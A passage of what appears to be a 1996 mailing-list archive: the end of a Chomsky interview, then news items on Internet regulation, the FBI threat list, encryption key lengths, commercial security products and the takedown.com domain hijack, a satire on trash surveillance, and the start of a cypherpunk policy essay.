against the working classes and the poor at home. GM and VW can not only
transfer production to Mexico and Brazil (or at least threaten to, which
often amounts to the same thing), but also to Poland and Hungary, where
they can find skilled and trained workers at a fraction of the cost. They
are gloating about it, understandably, given the guiding values.
We can learn a lot about what the Cold War (or any other conflict) was
about by looking at who is cheering and who is unhappy after it ends. By
that criterion, the victors in the Cold War include Western elites and the
ex-Nomenklatura, now rich beyond their wildest dreams, and the losers
include a substantial part of the population of the East along with working
people and the poor in the West, as well as popular sectors in the South
that have sought an independent path.
Such ideas tend to arouse near hysteria among Western intellectuals, when
they can even perceive them, which is rare. That's easy to show. It's also
understandable. The observations are correct, and subversive of power and
privilege; hence hysteria.
In general, the reactions of an honest person to the end of the Cold War
will be more complex than just pleasure over the collapse of a brutal
tyranny, and prevailing reactions are suffused with extreme hypocrisy, in
my opinion.
RBR: In many ways the left today finds itself back at its original starting
point in the last century. Like then, it now faces a form of capitalism
that is in the ascendancy. There would seem to be greater 'consensus'
today, more than at any other time in history, that capitalism is the only
valid form of economic organisation possible, this despite the fact that
wealth inequality is widening. Against this backdrop, one could argue that
the left is unsure of how to go forward. How do you look at the current
period? Is it a question of 'back to basics'? Should the effort now be
towards bringing out the libertarian tradition in socialism and towards
stressing democratic ideas?
CHOMSKY: This is mostly propaganda, in my opinion. What is called
'capitalism' is basically a system of corporate mercantilism, with huge and
largely unaccountable private tyrannies exercising vast control over the
economy, political systems, and social and cultural life, operating in
close co-operation with powerful states that intervene massively in the
domestic economy and international society. That is dramatically true of
the United States, contrary to much illusion. The rich and privileged are
no more willing to face market discipline than they have been in the past,
though they consider it just fine for the general population. Merely to
cite a few illustrations, the Reagan administration, which revelled in free
market rhetoric, also boasted to the business community that it was the
most protectionist in post-war US history - actually more than all others
combined. Newt Gingrich, who leads the current crusade, represents a
superrich district that receives more federal subsidies than any other
suburban region in the country, outside of the federal system itself. The
'conservatives' who are calling for an end to school lunches for hungry
children are also demanding an increase in the budget for the Pentagon,
which was established in the late 1940s in its current form because - as
the business press was kind enough to tell us - high tech industry cannot
survive in a pure, competitive, unsubsidized, 'free enterprise' economy,
and the government must be its saviour. Without the saviour, Gingrich's
constituents would be poor working people (if they were lucky). There would
be no computers, electronics generally, aviation industry, metallurgy,
automation, etc., etc., right down the list. Anarchists, of all people,
should not be taken in by these traditional frauds.
More than ever, libertarian socialist ideas are relevant, and the
population is very much open to them. Despite a huge mass of corporate
propaganda, outside of educated circles, people still maintain pretty much
their traditional attitudes. In the US, for example, more than 80% of the
population regard the economic system as inherently unfair and the
political system as a fraud, which serves the special interests, not the
people. Overwhelming majorities think working people have too little voice
in public affairs (the same is true in England), that the government has
the responsibility of assisting people in need, that spending for education
and health should take precedence over budget-cutting and tax cuts, that
the current Republican proposals that are sailing through Congress benefit
the rich and harm the general population, and so on. Intellectuals may tell
a different story, but it's not all that difficult to find out the facts.
RBR: To a point anarchist ideas have been vindicated by the collapse of the
Soviet Union - the predictions of Bakunin have proven to be correct. Do you
think that anarchists should take heart from this general development and
from the perceptiveness of Bakunin's analysis? Should anarchists look to
the period ahead with greater confidence in their ideas and history?
CHOMSKY: I think - at least hope - that the answer is implicit in the
above. I think the current era has ominous portent, and signs of great
hope. Which result ensues depends on what we make of the opportunities.
RBR: Lastly, Noam, a different sort of question. We have a pint of Guinness
on order for you here. When are you going to come and drink it?
CHOMSKY: Keep the Guinness ready. I hope it won't be too long. Less
jocularly, I'd be there tomorrow if we could. We (my wife came along with
me, unusual for these constant trips) had a marvellous time in Ireland, and
would love to come back. Why don't we? Won't bore you with the sordid
details, but demands are extraordinary, and mounting - a reflection of the
conditions I've been trying to describe.

Financial Times, 2 Feb 1996
Governments around the world are taking action to police
computer networks
By Our Foreign Staff
The US Congress last night passed legislation that
imposes stiff penalties for the distribution of
"indecent" material on the Internet, a global web of
computer networks that can be reached by an estimated 30m
computer users.
The action echoes moves by other leading industrial
countries to bring the Internet under some form of
control. It coincides with a call by French officials for
an international law on communications to deal with
regulation of electronic publishing on the Net.
In Japan, meanwhile, Tokyo police have made what are
believed to be the first arrests in a crackdown on the
distribution of pornography via computer networks.
The rapid growth of the Internet has created widespread
concerns about its use to distribute pornography, racial
hate messages and other offensive materials. However the
vast bulk of material published on the global computer
network is commercial or technical in nature.
The measures passed in the US Congress, which were
attached to a broad Telecommunications Bill, for the
first time place legal limits on the types of materials
that can be distributed via computer networks.
Government intervention is strongly opposed by Internet
pioneers, and by many within the computer industry, who
believe that rapid growth of the Internet and electronic
commerce will be stunted by regulation. Moreover, legal
experts say that the regulation of cyberspace raises
complex issues about jurisdiction because the Internet
carries information across national borders.
In France, the issue has been brought to a head by the
recent publication, on the Internet, of "Le Grand Secret"
(The Big Secret), a book about Francois Mitterrand's
battle with cancer written by Dr Claude Gubler, the late
president's personal physician, which has been banned by
the French courts. Mr Francois Fillon, post and telecoms
minister, said in the French Senate yesterday that he was
to propose to a March meeting of EU culture and telecoms
ministers an international conference to debate a law.
He said the government was creating a working group with
representatives from the ministries of justice, culture
and telecoms, and stressed that his concerns included the
problem of dealing with regulation outside national
boundaries and the difficulty of pursuing those who
abused the system.
He also suggested the possibility of introducing ethical
codes for Internet operators along the lines of those
already in place for the country's Minitel telephone-
based information system.
In Japan, where use of the Internet is growing rapidly,
the legality of publishing pornography on computer
networks is about to be tested in the courts following
the first arrests for allegedly criminal use of the
Tokyo police announced that they had arrested a
28-year-old businessman, Mr Hiroshi Kamekura, on
suspicion of distributing pornographic pictures. He is
alleged to have produced the images at home and
distributed them on his home page since last month, said
police. According to Mr Kamekura, the service was popular
and he was asked by other Internet users to produce more
provocative pictures.
Police also arrested a high school student, accused of
distributing pornographic pictures over the Internet
since last September. The arrests may raise eyebrows in
a country where graphic, frequently sadistic pornography,
moderated only by a ban on depictions of pubic hair, is
openly sold on book stalls everywhere.
A German court has already acted to prevent users in that
country from accessing sexually explicit Internet
discussion groups. The court forced Compuserve, a
US-based online information service, to block access to
about 200 of the thousands of "Usenet" groups to be found
on the Internet.

@_subject: What is this threat? 
The USG offers a $500,000 reward for stopping:
   Perception management and active measures activities.
The FBI DECA terms it one of seven "foreign intelligence activities that are deemed to be significant threats to  U.S. national security interests."
URL: DECA (pronounced "DECK-UH") is the FBI's program for the
Development of Espionage, Counterintelligence and
Counterterrorism Awareness. The DECA program disseminates
information concerning national security matters.
The FBI is the lead counterintelligence agency in the
United States. It has the principal authority to conduct
and coordinate counterintelligence and counterterrorism
investigations and operations within the United States.
The FBI, supported by other U.S. agencies as needed,
conducts espionage investigations when the subject of the investigation is not under the jurisdiction of the
Department of Defense, Uniform Code of Military Justice.
NATIONAL SECURITY THREAT LIST
The FBI's foreign counterintelligence mission is set out
in a strategy known as the National Security Threat List
(NSTL). The NSTL combines two elements:
*  First, it includes national security threat issues
   regardless of the country of origin.
*  Second, it includes a classified list of foreign
   powers that pose a strategic intelligence threat to
   U.S. security interests.
The issue threat portion of the NSTL was developed in
concert with the U.S. Intelligence Community and key
elements of the U.S. Government. As a result, the FBI
identified seven categories of foreign intelligence
activity that were deemed to be significant threats to U.S. national security interests. The FBI will
investigate the intelligence activities of any country
that are related to any of these seven issues. They are:
1. Proliferation of special weapons of mass destruction
   to include chemical, biological, nuclear, and delivery
   systems of those weapons of mass destruction.
2. Collection of information relating to defense
   establishments and related activities of national
   preparedness.
3. U.S. critical technologies as identified by the
   National Critical Technologies Panel.
4. Targeting of U.S. intelligence and foreign affairs
   information and U.S. Government officials.
5. Collection of U.S. industrial proprietary economic
   information and technology, the loss of which would
   undermine the U.S. strategic industrial position.
6. Clandestine foreign intelligence activity in the
   United States.
7. Perception management and active measures activities.
NATIONAL CRITICAL TECHNOLOGIES
Foreign intelligence activities directed at U.S. critical
technologies are of specific interest to the FBI. These
critical technologies are listed as follows:
   *  Materials:
      +  Materials synthesis and processing
      +  Electronic and photonic materials
      +  Ceramics
      +  Composites
      +  High-performance metals and alloys
   *  Manufacturing:
      +  Flexible computer-integrated manufacturing
      +  Intelligence processing equipment
      +  Micro- and nanofabrication
      +  Systems management technologies
   *  Information and communications:
      +  Software
      +  Micro and optoelectronics
      +  High-performance computing and networking
      +  High-definition imaging and displays
      +  Sensors and signal processing
      +  Data storage and peripherals
      +  Computer simulation and modeling
   *  Biotechnology and life sciences:
      +  Applied molecular biology
      +  Medical technology
   *  Aeronautics and surface transportation:
      +  Aeronautics
      +  Surface transportation technologies
   *  Energy and environment:
      +  Energy technologies
      +  Pollution minimization, remediation, and waste
         management
National Security Begins With You
You may be the target of foreign intelligence activity if
you or your company are associated in any of the critical
technologies listed above. Foreign powers may also seek
to collect U.S. industrial proprietary economic
information and technology, the loss of which would
undermine the U.S. strategic industrial position. Foreign
intelligence collectors target corporate marketing
information in support of their nation's firms. Overseas
travel, foreign contact, and joint ventures may further
increase your exposure to the efforts of foreign
intelligence collectors. If you suspect possible foreign
intelligence activity, or have questions concerning the
National Security Threat List strategy, please contact
the FBI DECA Coordinator at the FBI Field Office nearest
Up to $500,000 Reward for Stopping Espionage
An amendment to title 18 U.S.C. Section 3071, recently
enacted, authorizes the Attorney General to make payment
for information of espionage activity in any country
which leads to the arrest and conviction of any
1. ...for commission of an act of espionage against the
   United States;
2. ...for conspiring or attempting to commit an act of
   espionage against the United States;
3. or which leads to the prevention or frustration of an
   act of espionage against the United States.
Specifics of this amendment can be obtained from any FBI
DECA Coordinator.

"Perception management" means any method used to conceal
intelligence or counterintelligence -- HUMINT, ELINT,
SIGINT, etc. -- including encryption or other operations
or communication technologies not accessible to, or
comprehensible by, the USG.
"Active measures activities" means any operations, human,

The threat is a catch-all for interference with, or operation against intelligence and counterintelligence, surveillance and counter-surveillance or any other means used by the USG to protect against threats.
Its obscurity is used to cover in general what is not
covered explicitly by the other six well-known threats

@_subject: Indecent Trash 
I can see it now... about the time that Grandson of Altavista finally yields a URL for Jimmy Hoffa's body in some dump somewhere the government will have figured out that it's so much simpler to catalog the stuff on the way IN, when all the artifacts are fresh and unmixed. While we're all watching what the government does to intercept packets, they will be routing *trash* packets through mysterious "garbage routers."  As the stink grows stronger, someone will conceive of anonymous trash forwarders. They will accept unidentified trash, no questions asked, anonymize it with random DNA and fingerprint whorls, and sneak it into public trash receptacles. DNA generators will enable the mischievous to plant fabricated indications that Hillary did indeed have something going with Vince, the late Khomeini (hey, hard is hard, right?) as well as legions of four-footed friends, confirming the suspicions of As the piles of trash-based data grow, some Senator from
Nebraska will sound the alarm that kids are too easily exposed
to the indecent signs of private behavior retrievable on the
Net and will propose draconian measures to hold everyone
responsible for their contributions to the city landfill. Public receptacles will be closed. Trash will only be collected from registered Identifed Surplus Providers (ISP's). $250,000 fine for disposing of a condom in a dump accessible from the Internet... 10 years in prison for carelessly tossing those nasty Polaroids in the kitchen compactor. The trash of the world
will have to be made safe for kids to view.
Everything will be a lot easier to trace and control if the
garbage input is fully identified. Barcodes on trash bags
might do for starters. Access to the garbage system might have
to be restricted to those 18 and over. Trash collectors could
be made responsible for content, drafting them without pay into
the ranks of the trash police. People could be encouraged to
report suspicious trash, and trash-related activities like
neighbors sneaking out at night to place an innocent-looking
compactor bag down the block with someone else's trash.  For their own protection, youngsters might be required to retain all their garbage until age 18 and then, in a solemn ceremony worthy of the true significance of coming of age, pitch it all (duly anonymized to prevent abuse of minor indiscretions) from their new position as lawful participants in the world garbage system, friends and well-wishers trying to applaud and hold their noses at the same time (try it -- if you're not careful you can break your own nose, but hey, that'll work, too!). Who knows? Maybe Heinlein's advocacy of keeping kids in a barrel and feeding them through a hole until age 18 will enjoy resurgence among the compulsively protective while the Web meanwhile will provide real time underground data on Heinlein's rpm rate.
Protecting the trash of youth will, however, give rise to the hiding of adult trash among that of the underaged. The government
will have to root out offenders and "impute" suspicious trash to the parents. Those with no visible source of trash will of course be suspect, and will have to emit innocent trash to cover themselves. This will give rise to the practice of "trash laundering," in which agents convert nasty trash to innocuous trash that may then be tossed into any monitored, controlled channels with no repercussions.
Trash laundering will become a grave offense to the accompaniment of government and Ad Council PSA's and free brochures from Pueblo, Colorado. Blatant offenders who have fled to foreign climes will be kidnapped, some will be tortured,
because the War Against Filth will be a moral commitment of the national body. Foreign governments headed by suspected trash traffickers will be toppled in quickie invasions, their leaders brought back in chains to disappear into federal dungeons. Public debate will center on the legalities and rationalizations of using the military in policing domestic trash, while agencies such as the FBI cry for more budget to fight the scourge that threatens the decency of the nation's repositories.
Control of trash will spread inevitably to control of liquid wastes, whereupon a terrible discovery will be made: Everyone, but everyone, emits unspeakable bodily products. At that point the government will have no choice but to reluctantly declare everyone an outlaw and execute the populace.
It's all as logical as what happens when you introduce division by zero way down at the bottom of the complex equation where it isn't so noticeable.

@_subject: Strong Crypto Weak 
Strong Encryption Weak, Say Crypto Gurus
Washington, D.C., U.S.A., 6 February 1996 -- Strong
encryption is weak, reports a group of prominent
cryptographers and computer scientists. Their report,
released yesterday, is expected to play an important role
in coming debates over US policy on exports of software
that includes encryption capabilities. Current US policy generally limits exports to encryption
using 40-bit keys. On a case-by-case basis, the US has
allowed export of software with 56-bit digital encryption
standard (DES) encryption. Recently, two French graduate students cracked the 40-bit
encryption Netscape was using. The trick took several
days, using idle time on the school's computers. The seven experts who wrote the new paper -- "Minimal Key
Lengths for Symmetric Ciphers to Provide Adequate
Commercial Security" -- say the achievement by the
students at the Ecole Polytechnique was trivial. "Anyone with a modicum of computer expertise and a few
hundred dollars would be able to attack 40-bit encryption
much faster," they write. They add that using a field
programmable gate array (FPGA) chip, costing about $400
mounted on a card, "would on average recover a 40-bit key
in five hours."
"A more determined commercial predator," says the paper, "prepared to spend $10,000 for a set-up" using 25 FPGA
chips, "can find 40-bit keys in an average of 12
Moving to a 56-bit DES system doesn't solve the problem,
says the paper. "Calculations show that DES is inadequate
against a corporate or government attacker committing
serious resources. The bottom line is that DES is cheaper
and easier to break than many believe." And it is getting easier to crack DES code, says the
paper. "At present, it would take a year and a half for
someone using $10,000 worth of FPGA technology to search
out a DES key. In ten years time, an investment of this
size would allow one to find a DES key in less than a
A serious attack against DES, on the order of $300,000,
"could find a DES key in an average of 19 days using
off-the-shelf technology and in only three hours using a
custom developed chip," say the cryptoanalysts. That's
the sort of money a business, or a criminal organization,
might be willing to spend to find trade secrets or dip
into a flow of financial transactions. A government intelligence agency willing to spend $300
million "could recover DES keys in 12 seconds each," says
the paper. "The investment required is large, but not
unheard of in the intelligence community. It is less than
the cost of the Glomar Explorer, built to salvage a
single Russian submarine, and far less than the cost of
many spy satellites."
What's the proper key length for protection against
criminal operations or a prying government? The analysts
"strongly recommend a minimum key-length of 90 bits for
symmetric cryptosystems." That's far stronger than
anything the US government has ever contemplated allowing
for export.
The paper was written by some of the most prestigious  individuals in the field: Matt Blaze, Whitfield Diffie,
Ronald Rivest, Bruce Schneier, Tsutomu Shimomura, Eric
Thompson, and Michael Wiener. Blaze, at AT&T Research, recently demonstrated weaknesses
in the government's "Clipper Chip" key escrow system.
Diffie, at Sun Microsystems, was a co-creator of public
key cryptography. Rivest, at MIT, was one of the
inventors of the RSA public-key system and one of the
founders of RSA Data Security Inc.
Schneier, president of Counterpane Systems, is the author
of a leading textbook, Applied Cryptography. Shimomura,
at the San Diego Supercomputer Center, last year tracked
down outlaw hacker Kevin Mitnick. Thompson heads AccessData's crypto team, which has
regular clients that include the FBI and other law
enforcement agencies. Wiener, at Bell-Northern Research,
wrote an influential 1993 article, "Efficient DES Key

"Foolproof" Encrypted Fax System
Derby, England, 6 February 1996 -- Wordcraft, the
Derby-based software house, has announced that its
proposals for a "foolproof" secure fax transmission
system will be considered by the International
Telecommunications Union's meeting in Geneva,
Switzerland, next week. According to Mike Lake, the company's managing director,
Wordcraft has been working closely with a number of other
companies, notably Chantilly (another UK firm) on the
proposals, which will be considered alongside a competing
set from French and German companies.
Lake told Newsbytes that the Wordcraft system is known as
Automatic Fax Services (AFS) and consists of four
elements: authentication, message confirmation,
integrated encryption, and a certificate of receipt. The authentication element of AFS revolves the generation
of the fax device's serial number and unique transaction
number for each fax transmission. Message confirmation is
generated by the distant fax device, while the
certificate of receipt is printed after confirmation is received.
"Existing fax transmission reports are just that -- a
note of transmission. AGS creates a new document, a
certificate of receipt, which proves that a fax was
transmitted," Lake said.
The encryption system, meanwhile, uses a proprietary, but
open systems standard of encryption, using a one-time
passkey, which is transmitted by the sending fax device
in a secure manner.
"This contrasts with the French/German system which is
based on RSA's private and public key system. That system
is flawed, since it relies on the US Government licensing
a manufacturer to use the algorithm, something that the
Government is unlikely to do with, for example, a
Japanese fax manufacturer," Lake explained.
According to Lake, even if the ITU Study Group 8 approves
the French/German secure fax system next week, no major
fax vendor is likely to implement such a system on their
fax machines if the US Government is allowed to licence
each fax machine for use.
"The AFS system is secure, yet does not need the
permission of anybody to use it. In that sense, it's a
more global system," he said.
So what does Wordcraft get out of the proposed standard?
According to Lake, the company is offering a series of C
language routines for inclusion in the firmware of fax
machines, and fax software drivers. These routines, he
said, allow driver programs to be coded very easily. It
is the modest licence fees for this software with which Wordcraft is hoping to recoup its investment.

GE Info Services Launches New Transaction Technology Rockville, Md., 6 February 1996 -- General Electric's  GE Information Services division said it is launching a
new set of hardware and software products that will
protect business transactions over the Internet. One of
the features of the new system, called "GE
InterBusiness," involves using one-time use encryption
codes for each online session. The new offering combines the one-time, or dynamic,
encrypted session key, mutual authentication, and
advanced firewall technology, officials said. By using
standard Internet protocols, a user can conduct
electronic data interchange, electronic messaging, and
electronic file transfers via a secure "pipeline." Those
three elements are key in both electronic commerce and GE
Information Services' Business Productivity solutions.
Anne Biehl, manager of market development for GE
Information Services, said one of the key differentiators
between her company's secure business transaction
technology and offerings from other companies lies with
the dynamic encrypted session key. "This is the first
system on the market today, that we know of, that's using
(this technology)," she said. "It's a pretty powerful
'ring of security' for our users. It's a nice feature
we've integrated into our total solution." With the
dynamic session key, the session is encrypted to secure
all information passed from sender to receiver. The key
itself is never seen on the Internet, and hackers can't
break the encryption, officials stressed.
The new system uses the standard networking and
connectivity of the Internet to interface with systems
used by GE's 40,000-plus customer companies, officials
said. GE InterBusiness runs on all browsers, resides on
any Internet-compatible desktop, and interacts with
standard Internet applications.
GE InterBusiness is available now, Biehl said. Pricing
varies depending on the client's requirements, she said.
Biehl said today's announcement has nothing to do with
the completed sale of the group's GEnie online service to
Queens, New York-based Yovelle Renaissance Corporation,
reported last month.

AT&T WorldNet Spurs Online Credit Use
Bridgewater, NJ, 6 February 1996 -- In a teleconference
today, officials of AT&T's WorldNet and Universal Card
services announced a program aimed at allowing users to
"feel safe" in making online transactions by waiving the
standard $50 deductible fee on the use of credit cards
for "fraudulent" purposes.
The new program, to begin within eight weeks, will apply
to all dial-up customers of both WorldNet and Universal
Card Services, as well as to corporate users of
WorldNet's LAN (local area network) Service who use their
Universal Cards upon registering for WorldNet, said Tom
Evslin, VP of AT&T Gateway Services, speaking during the
Some $200 billion in sales were conducted over AT&T's 800
numbers last year, in comparison to only $500 million in
sales over the Internet, Evslin pointed out.
"Secure credit card" technology is an important
ingredient in spurring more electronic commerce, the VP
acknowledged, noting that AT&T is one of the partners in
the new SET (Secure Electronic Transactions) alliance
unveiled by Mastercard and Visa last week.
But based on the results of studies conducted by AT&T
among consumers, it is just as important that consumers
"feel safe" in doing business online as that they "be
safe," Evslin told the reporters and analysts. "What's important to consumers is that AT&T put its money
where its mouth is, rather than ask consumers to take the
risk," the VP asserted. AT&T will launch the new "deductible fee waiver" in
conjunction with the availability of dial-up access to
WorldNet, a new Internet "content aggregation" service
now in beta, by the end of this quarter, according to
Evslin. AT&T rolled out the WorldNet LAN Connectivity
Service together with BBN Planet last fall.
AT&T plans to be "aggressive" in promoting WorldNet in
the US and overseas, though mechanisms that will include
cross-marketing programs with AT&T Universal Card Service
as well as with third-party partners such as Netscape,
Verity, McKinley, and as of last week, Broderbund, he
told the press.
AT&T Universal Card now has more US card holders than any
other credit card, according to Evslin. The AT&T also
told reporters that he expects other credit card
companies will follow AT&T's lead in suspending the $50
deductible charge in online transactions.

@_subject: GTE's Virtual CA 
GTE's CyberTrust For Web Electronic Commerce
Washington, D.C., 6 February 1996 -- GTE officials say
that the company's new CyberTrust electronic commerce
program will allow companies for the first time to handle
most of the CA (Certification Authority) function by
themselves, by means of secure Web servers. At the Comnet press conference, reporters were told that
GTE, a partner of both Mastercard and Visa, will
introduce its new "Virtual CA" capability for Webmasters
in conjunction with a trio of related services.
The four new services from GTE are aimed at financial  institutions, online merchants, and government agencies,
as well as at the corporate and consumer markets, said
Charles S. Walton, Jr., CyberTrust's program director,
speaking at the Comnet press event. One component of CyberTrust, called the Electronic
Commerce Service, will provide an "infrastructure" for
credit card companies using new secure payment standards
for online transactions, Walton added. Another new service, the Partner Forum, will provide
online test services and tech support for developers and
integrators in the electronic commerce arena. Through GTE's new Cybersign service, GTE will directly
handle the maintenance of public key certificates, as
well as the issuance, renewal, and revocation of these
But with Virtual CA, GTE will manage certificate
management only, permitting Webmasters at subscribing
companies to do their own issuance, renewal, and
revocation of certificates.
Walton acknowledged that GTE's new suite of services will
be targeted at the same market now dominated by Verisign.
But the GTE services, he maintained, will be
differentiated on the basis of general "operational
environment," as well as by Virtual CA. In a follow-up interview later, Walton said that GTE, a
long-time consultant to Mastercard, began working with
both Mastercard and Visa last November on development of
SET (Secure Electronic Transactions), a new joint
standard for online credit card transactions. GTE, he added, hosted both Mastercard and Visa last week
at GTE headquarters in Needham, Massachusetts. Aside from
GTE, Mastercard and Visa, other partners in the SET
effort include Verisign, IBM, Microsoft, Netscape, SAIC,
and Terisa Systems.
GTE had previously helped Mastercard to create the SEPP
standard, according to Walton. GTE's new CyberTrust,
first announced as supporting SEPP, will now support its
"successor," SET, he noted. CyberTrust will also comply
with the SSL protocol for Web security.
During the press event at Comnet, Walton reported that
Cybersign and Virtual CA will implement a "dual card,
split RSA key design," with "strong access controls." The
two systems will use PCMCIA cryptographic hardware token
technology and X.509-certificate-compatible software.
Virtual CA, he continued, will initially be available on
Sun Solaris-based secure Web servers, but will be ported
to Windows NT-based secure Web servers by the end of
1996. End users will be able to access Virtual CA through
Netscape browsers.
The Web server-based service will introduce "verification
at the server level, which is really where you want it to
be," asserted the GTE official. On-site Webmasters are in a particularly good position to
confirm that users "are who they say they are," the
journalists were told. As a result, Virtual CA will use a technique called "pre-
verification," in which the Webmaster, or RA
(Registration Authority), will validate and approve
users' certificate requests before the requests go to
CyberTrust. CyberTrust will then return a certificate for
the end user, in the form of an algorithm, either direct
to the end user or through the RA.
Companies subscribing to Virtual CA will receive custom
home pages for certificate data entry, and for issuing,
renewing, and revoking certificates, Walton said. The CyberTrust program director said that the  special PCMCIA hardware will be used at the "CA level"
only, and will not be required by either end users or
No "actual cards" will be issued to, or needed by either
group, he added. GTE plans to begin offering both Virtual
CA and Cybersign in the second quarter.

Shimomura, Pursuer of Hackers, Finds Himself Homeless on
By Jared Sandberg
A renowned hacker catcher who co-wrote the book
"Takedown" just got a bit of a takedown himself.
Tsutomu Shimomura, the Internet security expert credited
with catching fugitive hacker Kevin Mitnick last year,
set up a site on the Internet's World Wide Web to
chronicle the famous cat-and-mouse chase. To supplement
the book, the on-line database includes audio clips of
taunting messages Mr. Mitnick left for Mr. Shimomura and
transcripts of chat sessions that the hacker held with
friends, under the heading "Kevin On Demand."
But over the weekend, the address of the Web site,
"takedown.com," was deleted at a hacker's request and
replaced with a bogus entry, "takendown.com."
Not exactly hilarious, but this is hacker humor.
"It's pretty juvenile," said Mr. Shimomura, who got his
address back by Wednesday night. But he notes that
hackers could easily change the Internet addresses of
corporations or even America Online Inc. "I expect that
businesses like AOL would be much less amused if they
were renamed 'aohell.com,' and that would cost them real
The problem arose when Network Solutions Inc., the
company that sets up addresses on the Internet, was
apparently conned by someone claiming to be Mr.
Shimomura. A company official said that he hadn't been
able to investigate the matter because the company has
been deluged with electronic mail in an unrelated prank.
But many experts are concerned that Network Solutions
doesn't verify the authenticity of Internet address
requests, which number as many as 3,000 a day, and that
the company simply takes people at their word.
"They do it all the time, and they shouldn't," said
Steven Bellovin, a security expert at AT&T Corp.'s
research unit, who fears such dupes will grow more
common. Mr. Bellovin noted that hackers have also
exchanged software tools that can redirect users to phony
sites. "Hackers share tools better than the good guys,"
he said.
Network Solutions is working on a tool to check the
authenticity of requests for address changes. But some
think that such moves are a little late.
Mr. Shimomura said, "Unfortunately, we live in a world
where things need to break before they're fixed."

@_subject: IBM, RSA Security 
More On IBM's Internet SecureWay Security Plans
London, 9 February 1996 -- IBM UK has revealed a little
more of the detail surrounding its deal with RSA Data
Security for the Big Blue range of SecureWay Internet
security products and services.
According to Kathy Kincaid, director of IT (information
security) programs with Big Blue, the idea behind the
development project is to develop a set of open
cryptography standards for the Internet and other
networks, so supporting secure electronic commerce.
Both companies plan to develop interoperable security
across IBM products and other vendor platforms. According
to IBM, their efforts will provide customers and
developers with safe universal access to the Internet,
consistent with US and non-US export regulations
governing cryptographic products.
The linkup between the two companies, Kincaid explained,
will allow them to modify RSA's BSAFE encryption engine
and Big Blue's Common Cryptographic Architecture (CCA)
for interoperability between RSA's toolkits and IBM's
CCA-based hardware systems.
"The complementary skills, technology and experience of
IBM and RSA will greatly benefit our customers and the
security industry," Kincaid said, adding that both
companies have been testing interoperability across a
series of virtual private networks (VPNs).
Jim Bidzos, RSA's CEO, claims that the deal will involve
several levels of close cooperation between RSA and Big
Blue, with staff at RSA's labs working with IBM's crypto
researchers at its T J Watson facility to produce "more
efficient and secure commercial cryptography.
"In addition, there will be close cooperation on the
development of protocols and interfaces. The result
should be trusted, seamless, interoperable security
across not only the IBM product line, but across vendor
products as well, when the resulting technology is
adopted by both RSA and IBM's large customer vase," he
In parallel with the launch of the SecureWay range of
Internet products and services, IBM's Internet decision
has agreed to begin an internal pilot test of RSA Secure,
RSA's disk and file encryption technology, which includes
a facility for emergency key access.
Further details of IBM's SecureWay range of Internet
products and services can be found on Big Blue's World
Wide Web ages, at  . According to IBM,
its security products support the security component of
the Open Blueprint. A white paper on security in the Open
Blueprint is available from IBM's Canada's test lab Web
pages at
 . IBM & RSA Develop "SecureWay" Internet Products
London, 8 February 1996 -- IBM and RSA Data Security have teamed up to develop open cryptography systems for the
Internet and other networks. Thanks to the linkup, IBM
plans to ship a whole range of Internet security products
to tie in with its existing range of Internet services,
over the next few months.
Anna Russell, a spokesperson for IBM's UK and European
operations, said that the RSA technology and products
deal applies worldwide, with the resultant security
products expected to dovetail in with Big Blue's existing
range of Internet services for businesses, end users, and
major corporations.
The whole ensemble of services, hardware and software,
will be banded together under the umbrella name of
SecureWay, a name that Russell claims will get the
message across to potential users that the IBM portfolio
covers many different aspects of computer networking.
"The SecureWay products and services will be offered
throughout IBM channels, ranging from dealers, right
through to value-added resellers. The SecureWay range
will be offered through all channels on a global basis,"
she explained.
According to Russell, the SecureWay range include access
controls, cryptographic hardware and software for the IBM
server series, smart cards and readers, gateway
firewalls, single logon security admin systems,
anti-virus software, distributed security management,
directory and security services for network servers, and
Internet browsers and servers, as well as secured
Kathy Kincaid, director of IBM's information technology
(IT) security programs in the UK and Europe, explained
that the SecureWay product range will include an
emergency response service, "ethical hacking" by Big
Blue's global security analysis labs, and turnkey
firewall installation services. ...

Why There Exists No Middle Ground in the Crypto-policy Debate
[This message only appears to be posted anonymously, if you
 have the correct tools, you can learn my name and e-address.
 Take that auto-WWW indexers!]
Decius  recently presented an essay,
entitled ``Crypto-Absolutism,'' which described ``Why and how the
middle ground should be found in the crypto-policy debate.''  The
essay is clearly wrong in its assumptions and thus its conclusions.
Given the perceived flaws in the assumptions, his commentary must be
Within the context of this rebuttal, ``T-Camp Cypherpunks'' are those
``Cypherpunks'' (whatever they are :-) that follow a technology
evolution-based line of reasoning to arrive at the inevitable coming
of crypto-anarchy.  As well, ``A-Camp Cypherpunks'' are those that
advocate crypto-anarchy because they like the social and political
implications.  It is possible to be an A-Camp Cypherpunk or a T-Camp
Cypherpunk without being the other.  Of course, it is quite possible
to be both.  It has often been said on Cypherpunks, that ``we'' are
not a ``we''.  Decius falls into a trap by assuming that all
Cypherpunks are in the A-Camp.  This mistake colors the entire essay.
The main problem with Decius' essay is that it assumes that
Cypherpunks _merely_ advocate crypto-anarchy.  In fact, T-Camp
Cypherpunks do not stop at this puny point.  They observe that
crypto-anarchy is the _likely_ _outcome_ of the current technology
trend (this trend is discussed below).  Note that this observation of
fulfillment, if correct, is a far stronger statement than merely
advocating that crypto-anarchy should happen or would be a really good
A-Camp Cypherpunks also advocate that this trend should be exploited
to its conclusion, sooner rather than later, to preempt any massive
government crackdowns that would only prolong the transition pains.
The rationale being that these supposed government crackdowns have no
place in the natural evolution of a free society.  And that the
continuance of a free society is preferable to that of a move towards
a police state, which would be required to facilitate the useless ---
in the end --- crackdown on this information technology.
Decius is also wrong when he states that crypto-anarchy means people
will never again be accountable or recognized (pure A-Campers might
like this to be true, although I doubt it).  In the T-Camper's view,
crypto-anarchy means that people have the choice of when they wish to
be accountable and recognized for their statements and information
movement-related actions and when they wish otherwise.  People are not
forced under the crypto-anarchy model to be unaccountable or
unrecognizable.  Likewise, the crypto-anarchy model allows people to
ignore those that are unaccountable and unrecognizable, if they wish.
Decius fails to recognize that people could be recognized, and even
paid, for example, when operating under a pseudonym instead of
completely anonymously (this concept links two Cypherpunks favorites:
untraceable anonymous e-cash and anonymous reputations).
As primary counter-points to Decius on this issue:
- - The people who wrote the Federalists' Papers did so anonymously,
  yet I suspect that all were well-known and transacted business and
  other politics under their ``real names'' most of the time.
- - Individual articles are anonymously published in the _The Economist_
  yet I suspect that people are being paid to contribute information
  to this newspaper (at least, I know I am paying a lot per year, for
  a newspaper, to get the information :-).
- - The recently released ``Primary Colors'' book by Anonymous.  Yet
  this person, if the publisher is to be believed, is well-known to
